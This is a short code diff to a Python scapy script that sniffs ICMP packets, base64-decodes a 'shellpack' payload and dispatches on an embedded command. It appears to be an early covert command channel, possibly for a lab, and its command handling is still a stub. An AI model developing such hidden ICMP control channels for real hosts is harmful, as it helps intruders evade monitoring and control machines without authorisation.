@@ -2,12 +2,13 @@
 
 from scapy.all import sr,IP,ICMP,Raw,sniff
 import os
-import netifaces
 import socket
 import psutil
 import pwd
 import base64
-
+from multiprocessing import Process
+import json
+import ast
 
 dest = "192.168.157.6"
 ICMP_ID = int(12800)
@@ -85,11 +86,17 @@ def sniff_callback(packet):
         pass
 
     encoded_shellpack = (packet[Raw].load).decode('utf-8', errors='ignore')
-    shellpack = base64.b64decode(encoded_shellpack)
-    print(shellpack)
+    shellpack = base64.b64decode(encoded_shellpack).decode()
+    unpacked = ast.literal_eval(shellpack)
+    
+    match unpacked['command']:
+        case "join":
+            print("asdasd")
+
+    print(unpacked['command'])
 
 def sniffing(host):
-     sniff(iface=host.iface, filter="icmp", prn=on_capture, store="0")
+     sniff(iface=host.iface, filter="icmp", prn=sniff_callback, store="0")
 
 def setup_host() -> Host:
     print("[ Setting up host... ]")
@@ -107,4 +114,4 @@ if __name__ == "__main__":
     
     print("Starting listener")
     while True:
-        input("Waiting...")
+        input("")
